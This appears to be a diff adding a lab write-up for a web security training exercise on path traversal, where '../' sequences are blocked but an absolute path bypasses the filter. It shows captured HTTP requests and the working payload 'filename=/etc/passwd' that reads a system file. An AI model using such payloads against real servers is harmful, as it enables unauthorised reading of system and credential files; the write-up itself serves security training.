@@ -1,0 +1,73 @@
+#+title: File path traversal, traversal sequences blocked with absolute path bypass
+
+* Table of Contents :toc:
+- [[#lab-contains][Lab Contains]]
+- [[#end-goal][End Goal]]
+- [[#solution][Solution]]
+- [[#payload-to-solve-the-lab][Payload to solve the lab]]
+
+* Lab Contains
+- directory traversal vulnerability on display of product images
+- blocks traversal sequences
+  - but treats the supplied filename as being relative to default working directory
+* End Goal
+- retrieve the contents of the ~/etc/passwd~ file
+* Solution
+- Access the lab
+- Open one of products image on the new tab and intercept the request in burpsuite
+  #+begin_src shell
+    GET /image?filename=1.jpg HTTP/2
+    Host: 0a9300d8035243288e6a7ed6008100b8.web-security-academy.net
+    Cookie: session=f65IPhb2qtFuvrEO8i30w8qQ4MNEqcyG
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: https://0a9300d8035243288e6a7ed6008100b8.web-security-academy.net/
+    Dnt: 1
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Sec-Gpc: 1
+    Te: trailers
+  #+end_src
+- so change ~1.jpg~ to ../../../etc/passwd to check if the we can get the contents of /etc/passwd file
+  #+begin_src shell
+    HTTP/2 400 Bad Request
+    Content-Type: application/json; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 14
+
+    "No such file"
+  #+end_src
+  - According to lab description it is blocking our traversal sequences. Now try with absolute path like ~/etc/passwd~ and see the response
+   #+begin_src shell
+     GET /image?filename=/etc/passwd HTTP/2
+     Host: 0a9300d8035243288e6a7ed6008100b8.web-security-academy.net
+     Cookie: session=f65IPhb2qtFuvrEO8i30w8qQ4MNEqcyG
+     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+     Accept-Language: en-US,en;q=0.5
+     Accept-Encoding: gzip, deflate
+     Referer: https://0a9300d8035243288e6a7ed6008100b8.web-security-academy.net/
+     Dnt: 1
+     Upgrade-Insecure-Requests: 1
+     Sec-Fetch-Dest: document
+     Sec-Fetch-Mode: navigate
+     Sec-Fetch-Site: same-origin
+     Sec-Fetch-User: ?1
+     Sec-Gpc: 1
+     Te: trailers
+  #+end_src
+  - Awala!! 200 OK
+  #+begin_src shell
+    HTTP/2 200 OK
+    Content-Type: image/jpeg
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 2316
+  #+end_src
+
+* Payload to solve the lab
+- /etc/passwd
